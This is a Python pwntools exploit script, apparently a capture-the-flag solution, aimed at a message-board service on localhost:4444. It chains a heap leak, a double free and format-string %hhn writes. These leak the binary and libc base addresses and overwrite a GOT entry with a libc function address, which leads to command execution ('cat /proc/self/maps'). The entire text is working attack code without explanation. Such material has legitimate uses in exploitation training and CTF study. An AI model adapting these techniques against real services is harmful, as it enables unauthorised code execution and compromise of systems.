from pwn import *
import time
context.log_level = 'debug'

def m():
    r.recvuntil("menu >")

def send(msg):
    r.send(msg)
    time.sleep(0.05)

def reg(name, msg):
    m()
    send("2\n")
    send("%s" % name)
    send("%d\n" % len(msg))
    send(msg)

def rm(idx):
    m()
    send("3\n")
    send("%d\n" % idx)

def l():
    m()
    send("1\n")

def edit(idx, msg):
    m()
    send("4\n")
    send("%d\n" % idx)
    send("%d\n" % len(msg))
    send(msg)

def fsb(msg):
    if (len(msg) > 16):
        print("MSG IS TOO LONG: %s" % msg)
        raise
    edit(0, (msg + "\n").ljust(17, "A"))
    l()
    r.recvuntil("Message Board Entry\n")
    return r.readline()

def chfmt(delim, name, align):
    m()
    send(delim + "\n")
    send(name + "\n")
    send(align + "\n")

r = remote('localhost', 4444)
reg("A"*16, "A"*20)
l()
r.readline()
r.readline()
heap = u32(r.readline()[21:25]) - 0xc0
print("HEAP: %08X" % heap) # 0x56559000

reg("A", "A"*20)
rm(0)
rm(1)
rm(0)
reg("A", "A"*20)
reg("A", "A"*256)
reg("A", "A"*16 + p32(heap + 0x8))

bin_base = int(fsb("%26$p").split("0x")[1], 16) - 0x99d
print("BIN_BASE: %08X" % bin_base)
libc_base = int(fsb("%106$p").split("0x")[1], 16) - 0x19af3
print("LIBC_BASE: %08X" % libc_base)

raw_input()
argv = int(fsb("%108$p").split("0x")[1], 16)
argv1 = int(fsb("%148$p").split("0x")[1], 16)
if argv1 % 4:
    argv1 += (4 - argv1 % 4)
gap = (argv1 - argv) / 4 + 148
print("ARGV: %08X" % argv)
print("ARGV1: %08X" % argv1)
GOT = bin_base + 0x3010
value = libc_base + 0x00040310

for j in xrange(4):
    data = GOT + j

    for i in xrange(4):
        fsb("%{0}c%108$hhn\n".format((argv1 + i) & 0xff))
        fsb("%{0}c%148$hhn\n".format(data & 0xff))
        data >>= 8

    fsb("%{0}c%{1}$hhn\n".format(value & 0xff, gap))
    value >>= 8

edit(0, "cat /proc/self/maps\n")
raw_input("XXX\n")
chfmt("1", "y", "y")
l()
raw_input()
